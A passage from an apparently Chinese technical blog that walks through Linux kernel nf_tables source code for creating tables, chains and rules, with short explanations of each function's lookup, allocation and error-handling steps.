ntohl(nla_get_be32(nla[NFTA_TABLE_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_TABLE_F_DORMANT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">table = kzalloc(<span class="keyword">sizeof</span>(*table), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_kzalloc;</span><br><span class="line"></span><br><span class="line">table-&gt;name = nla_strdup(attr, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table-&gt;name == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_strdup;</span><br><span class="line"></span><br><span class="line">err = rhltable_init(&amp;table-&gt;chains_ht, &amp;nft_chain_ht_params);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> err_chain_ht;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;chains);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;sets);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;objects);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;flowtables);</span><br><span class="line">table-&gt;family = family;</span><br><span class="line">table-&gt;flags = flags;</span><br><span class="line">table-&gt;handle = ++table_handle;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line">err = nft_trans_table_add(&amp;ctx, NFT_MSG_NEWTABLE);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_trans;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;table-&gt;<span class="built_in">list</span>, &amp;net-&gt;nft.tables);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_trans:</span><br><span class="line">rhltable_destroy(&amp;table-&gt;chains_ht);</span><br><span class="line">err_chain_ht:</span><br><span class="line">kfree(table-&gt;name);</span><br><span class="line">err_strdup:</span><br><span class="line">kfree(table);</span><br><span class="line">err_kzalloc:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>attr = nla[NFTA_TABLE_NAME];</code>查找是否存在<code>table</code>，如果存在则调用<code>nf_tables_updtable(&amp;ctx);</code>进行更新，如果不存在则使用<code>kzalloc</code>创建，然后最后将其放到上下文中，并且加入到<code>&amp;net-&gt;nft.tables</code>中。</p><h3 id="创建chain操作"><a href="#创建chain操作" class="headerlink" title="创建chain操作"></a>创建chain操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newchain</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">u8 policy = NF_ACCEPT;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">u64 handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">attr = nla[NFTA_CHAIN_NAME];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_CHAIN_HANDLE]));</span><br><span class="line">chain = nft_chain_lookup_byhandle(table, handle, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">attr = nla[NFTA_CHAIN_HANDLE];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">chain = nft_chain_lookup(net, table, attr, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(chain) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_POLICY]) &#123;</span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    !nft_is_base_chain(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    nla[NFTA_CHAIN_HOOK] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_CHAIN_POLICY]));</span><br><span class="line"><span class="keyword">switch</span> (policy) &#123;</span><br><span class="line"><span class="keyword">case</span> NF_DROP:</span><br><span class="line"><span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_updchain(&amp;ctx, genmask, policy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_addchain(&amp;ctx, family, genmask, policy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</code>获取对应的<code>table</code>，如果是没有则直接退出。然后上面存在两种方式寻找<code>chain</code>，如果找到了调用<code>nf_tables_updchain(&amp;ctx, genmask, policy);</code>进行更新即可，如果没有则使用<code>nf_tables_addchain(&amp;ctx, family, genmask, policy);</code>添加。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_addchain</span><span class="params">(struct nft_ctx *ctx, u8 family, u8 genmask,</span></span></span><br><span class="line"><span class="params"><span class="function">                              u8 policy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> * <span class="title">const</span> *<span class="title">nla</span> =</span> ctx-&gt;nla;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span> =</span> ctx-&gt;table;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> *<span class="title">basechain</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span> *<span class="title">stats</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> ctx-&gt;net;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> **<span class="title">rules</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (table-&gt;use == UINT_MAX)</span><br><span class="line">    <span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nla[NFTA_CHAIN_HOOK]) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_hook</span> <span class="title">hook</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">    err = nft_chain_parse_hook(net, nla, &amp;hook, family, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    basechain = kzalloc(<span class="keyword">sizeof</span>(*basechain), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (basechain == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      nft_chain_release_hook(&amp;hook);</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hook.dev != <span class="literal">NULL</span>)</span><br><span class="line">      <span class="built_in">strncpy</span>(basechain-&gt;dev_name, hook.dev-&gt;name, IFNAMSIZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nla[NFTA_CHAIN_COUNTERS]) &#123;</span><br><span class="line">      stats = nft_stats_alloc(nla[NFTA_CHAIN_COUNTERS]);</span><br><span class="line">      <span class="keyword">if</span> (IS_ERR(stats)) &#123;</span><br><span class="line">        nft_chain_release_hook(&amp;hook);</span><br><span class="line">        kfree(basechain);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(stats);</span><br><span class="line">      &#125;</span><br><span class="line">      rcu_assign_pointer(basechain-&gt;stats, stats);</span><br><span class="line">      static_branch_inc(&amp;nft_counters_enabled);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    basechain-&gt;type = hook.type;</span><br><span class="line">    chain = &amp;basechain-&gt;chain;</span><br><span class="line"></span><br><span class="line">    ops= &amp;basechain-&gt;ops;</span><br><span class="line">    ops-&gt;pf= family;</span><br><span class="line">    ops-&gt;hooknum= hook.num;</span><br><span class="line">    ops-&gt;priority= hook.priority;</span><br><span class="line">    ops-&gt;priv= chain;</span><br><span class="line">    ops-&gt;hook= hook.type-&gt;hooks[ops-&gt;hooknum];</span><br><span class="line">    ops-&gt;dev= hook.dev;</span><br><span class="line"></span><br><span class="line">    chain-&gt;flags |= NFT_BASE_CHAIN;</span><br><span class="line">    basechain-&gt;policy = policy;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chain = kzalloc(<span class="keyword">sizeof</span>(*chain), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (chain == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line">  ctx-&gt;chain = chain;</span><br><span class="line"></span><br><span class="line">  INIT_LIST_HEAD(&amp;chain-&gt;rules);</span><br><span class="line">  chain-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line">  chain-&gt;table = table;</span><br><span class="line">  chain-&gt;name = nla_strdup(nla[NFTA_CHAIN_NAME], GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!chain-&gt;name) &#123;</span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rules = nf_tables_chain_alloc_rules(chain, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!rules) &#123;</span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *rules = <span class="literal">NULL</span>;</span><br><span class="line">  rcu_assign_pointer(chain-&gt;rules_gen_0, rules);</span><br><span class="line">  rcu_assign_pointer(chain-&gt;rules_gen_1, rules);</span><br><span class="line"></span><br><span class="line">  err = nf_tables_register_hook(net, table, chain);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">  err = rhltable_insert_key(&amp;table-&gt;chains_ht, chain-&gt;name,</span><br><span class="line">                            &amp;chain-&gt;rhlhead, nft_chain_ht_params);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> err2;</span><br><span class="line"></span><br><span class="line">  err = nft_trans_chain_add(ctx, NFT_MSG_NEWCHAIN);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rhltable_remove(&amp;table-&gt;chains_ht, &amp;chain-&gt;rhlhead,</span><br><span class="line">                    nft_chain_ht_params);</span><br><span class="line">    <span class="keyword">goto</span> err2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  table-&gt;use++;</span><br><span class="line">  list_add_tail_rcu(&amp;chain-&gt;<span class="built_in">list</span>, &amp;table-&gt;chains);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  err2:</span><br><span class="line">  nf_tables_unregister_hook(net, table, chain);</span><br><span class="line">  err1:</span><br><span class="line">  nf_tables_chain_destroy(ctx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>basechain = kzalloc(sizeof(*basechain), GFP_KERNEL);</code>创建<code>basechain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span><span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_type</span>*<span class="title">type</span>;</span></span><br><span class="line">u8policy;</span><br><span class="line">u8flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span>*<span class="title">stats</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span><span class="title">chain</span>;</span></span><br><span class="line"><span class="keyword">char</span> dev_name[IFNAMSIZ];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随后将其中的成员地址给到<code>chain</code>，后续就是一系列的初始化环节</p><h3 id="创建rule操作"><a href="#创建rule操作" class="headerlink" title="创建rule操作"></a>创建rule操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>, *<span class="title">old_rule</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size, i, n, ulen = <span class="number">0</span>, usize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> err, rem;</span><br><span class="line">u64 handle, pos_handle;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_HANDLE]));</span><br><span class="line">rule = __nft_rule_lookup(chain, handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">old_rule = rule;</span><br><span class="line"><span 